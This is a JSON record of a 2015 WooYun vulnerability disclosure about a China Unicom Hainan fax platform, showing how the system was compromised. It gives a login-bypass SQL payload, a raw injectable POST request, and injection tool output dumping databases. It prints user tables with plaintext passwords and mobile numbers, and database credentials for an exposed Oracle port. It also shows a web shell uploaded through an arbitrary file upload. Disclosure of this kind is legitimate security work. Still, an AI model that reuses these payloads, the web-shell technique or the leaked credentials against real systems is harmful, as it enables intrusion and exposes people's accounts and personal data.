{"id": 71129, "wybug_id": "wooyun-2015-0132927", "wybug_title": "中国联通海南省某传真平台多个漏洞（注入、上传等）", "wybug_corp": "中国联通", "wybug_author": "JulyTornado", "wybug_date": "2015-08-12 14:28", "wybug_open_date": "2015-09-26 15:04", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传", "渗透测试思路", "安全意识不足"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-12：\tcncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开\t\t\t\t\t\t\t\t\t2015-08-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-26：\t细节向公众公开  简要描述： 中国联通海南省某传真平台漏洞打包 详细说明：  **.**.**.**/fax/login.jsp0x01 万能密码登录：用户名填写admin' or '1'='1，密码随意，可成功登录：\n\n\n\n0x02 SQL注入：包括但不仅限于“人事档案管理-人员管理”等信息查询功能，存在SQL注入：\nPOST /emp/jxtEmployeeRst.jsp HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: **.**.**.**/emp/jxtEmployee.jspAccept-Language: zh-CNUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like GeckoContent-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateContent-Length: 172DNT: 1Host: **.**.**.**Pragma: no-cacheCookie: JSESSIONID=6902EAA62E8189BC91E17DA05C7B72B3name=dfsf&sex=&cardid=&department=&nativeplace=&email=&m_tel=&folk=&h_tel=&title=&edulevel=&birth_date=&o_tel=&instime=&opempno=&butt=&rowId=&optFlag=&hidden2=&hidden3=&id=\nname等参数存在SQL注入：\n\n工具验证结果：\n\n\navailable databases [16]:[*] CTXSYS[*] DBSNMP[*] DMSYS[*] EXFSYS[*] LTJXT[*] MDSYS[*] OLAPSYS[*] ORDSYS[*] OUTLN[*] SCOTT[*] SYS[*] SYSMAN[*] SYSTEM[*] TSMSYS[*] WMSYS[*] XDB\n可泄露大量敏感信息：\nDatabase: LTJXT+---------------------+---------+| Table               | Entries |+---------------------+---------+| URL_TRACE           | 172615  || CS_DIALOUT_TEL      | 52453   || CS_DIALOUT_DETAIL   | 51752   || CS_DIALOUT_TASK     | 47836   || CS_DIALOUT_OPERATE  | 47754   || S_AFFIX             | 44429   || JXT_TICKET          | 42227   || JXT_DAYPAY          | 36077   || FAX_SEND_D          | 25805   || FAX_SEND_M          | 22935   || FAX_SMSMSG          | 22588   || JXT_TEAMRELA        | 14579   || JXT_MONTHFREE       | 13852   || TEMP_LOG            | 10938   || JXT_WORKLOG         | 6900    || FAX_RECEIVE         | 5363    || FAX_RECEIVE_HIS     | 3895    || JXT_EMPLOYEE        | 3773    || JXT_MONTHPAY        | 3769    || SMS_REVMSG          | 2750    || SMS_SNDMSG_HIS      | 1235    || JXT_GROUP_HIS       | 1115    || SMS_MODEL           | 846     || JXT_CUSTOMER        | 619     || BM_TS_MSGCONTENT    | 574     || FAX_TELNOCHECK      | 539     || JXT_SYSUSER         | 419     || JXT_GROUP           | 368     || JXT_CALLINGCARD     | 255     || JXT_PRV_ROLE        | 245     || BM_TS_DOWN          | 214     || JXT_SALE_MAN        | 175     || JXT_DISTRUST        | 161     || BM_LAWS             | 160     || BM_ANSWER           | 153     || LKF_WEBMAN          | 134     || JXT_MENU            | 88      || TEST_MENU           | 88      || CSQ                 | 65      || SMS_SNDMSG_FAULT    | 64      || BM_BMTS_CONTENT     | 62      || JXT_SYSUSER_HIS     | 59      || JXT_TEAM            | 57      || JXT_MENU_PAN        | 56      || JXT_MENU_TEST       | 56      || JXT_MEMO            | 54      || FAX_SEND_D_HIS      | 48      || JXT_DEPARTMENT      | 45      || JXT_SEAL            | 42      || BM_TS_MENU          | 32      || CS_DIALOUT_TIME     | 30      || BM_LINK             | 28      || SMS_D_TYPE          | 28      || SMS_MODEL_HIS       | 28      || JXT_RESGROUPID      | 27      || JXT_SUBCOM          | 25      || TMP_TICKET          | 12      || JXT_ROLE            | 9       || JXT_WORKFLOW        | 9       || TEST_ROLE           | 8       || FAX_CONTRAST_DETAIL | 7       || JXT_SMSTRANS        | 7       || SMS_M_TYPE          | 7       || SMS_MONTHRECKONING  | 7       || SMS_SNDMSG          | 7       || JXT_FEECODE         | 4       || JXT_WORKCHECK       | 4       || JXT_WORKFLOW_TYPE   | 4       || CS_FAX_SYSTEM       | 1       || FAX_AFFIX1          | 1       || JXT_GROUPID         | 1       || JXT_SRCTEL          | 1       || LKF_VERSION         | 1       |+---------------------+---------+\n0x03 用户密码明文保存：\nDatabase: LTJXT Table: JXT_SYSUSER[2 entries]+---------+----------+-------------+------+-------------+-------+--------+--------+---------+---------+---------+-----------+| GROUPID | SUBCOMID | NAME        | MTEL | EMPNO       | STATE | PASSWD | SMSTAB | SYSROLE | OPEMPNO | INSTIME | CRE_EMPNO |+---------+----------+-------------+------+-------------+-------+--------+--------+---------+---------+---------+-----------+| 10041   | 30       | 13322063918 | NULL | 13322063918 | 0     | 444999 | NULL   | 01      | SMS     |         | SMS       || 10042   | 30       | 13307575890 | NULL | 13307575890 | 0     | 202020 | NULL   | 50      | SMS     |         | SMS       |+---------+----------+-------------+------+-------------+-------+--------+--------+---------+---------+---------+-----------+\n\nable: LKF_WEBMAN[4 entries]+----------+-----------+-----------+------+------+------+-------------+-------+-------+------------+-------------+---------+| SUBCOMID | SYSUSERID | SUPUSERID | FAX  | NAME | ROLE | O_TEL       | STATE | EMAIL | PASSWD     | MOBTEL      | INSTIME |+----------+-----------+-----------+------+------+------+-------------+-------+-------+------------+-------------+---------+| 01       | sys       | NULL      | NULL |      | 0    | NULL        | 0     | NULL  | hnabc      | 13322004434 |         || 13       | qh01      | jt01      | NULL |      | 1    | NULL        | 0     | NULL  | 123456     | 13322002698 |         || 01       | ltsys     | NULL      | NULL |      | 0    | NULL        | 0     | NULL  | UNICOM2005 | NULL        |         || 01       | cs        | NULL      | NULL |      | 0    | 13322002325 | 0     | NULL  | 123456     | 13322002325 |         |+----------+-----------+-----------+------+------+------+-------------+-------+-------+------------+-------------+---------+\n0x04 任意文件上传：包括但不仅限于“如意传真-新建传真”功能，可上传任意文件：\nPOST /fax/FaxSend/Upload_Fax_Affix.jsp HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: **.**.**.**/fax/FaxSend/index.jspAccept-Language: zh-CNUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like GeckoContent-Type: multipart/form-data; boundary=---------------------------7df15b3b60cdeAccept-Encoding: gzip, deflateContent-Length: 7992DNT: 1Host: **.**.**.**……Content-Disposition: form-data; name=\"upload\"; filename=\"D:\\sectools\\web\\caidao-20141213\\Customize\\fckedit.jsp\"Content-Type: text/plain\n\n\n菜刀路径：**.**.**.**/fax/affix/2015_08_09/20150809150809045200_2501.jsp\n\n菜刀成功执行，可能威胁内网安全：\n\n\n\n0x05 Oracle数据库1521端口对外开放，可直接连接：\nconn = DriverManager.getConnection(\"jdbc:oracle:thin:@localhost:1521:oradata\", \"ltjxt\", \"ltjxt\");\n\n\n   漏洞证明：  同一类型的多处漏洞就不全列出来了，举一反三吧。。。   修复方案：  阿弥陀佛   版权声明：转载请注明来源 JulyTornado@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2015-08-12 15:03 厂商回复： CNVD确认所述情况，已经转由CNCERT下发给海南分中心，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}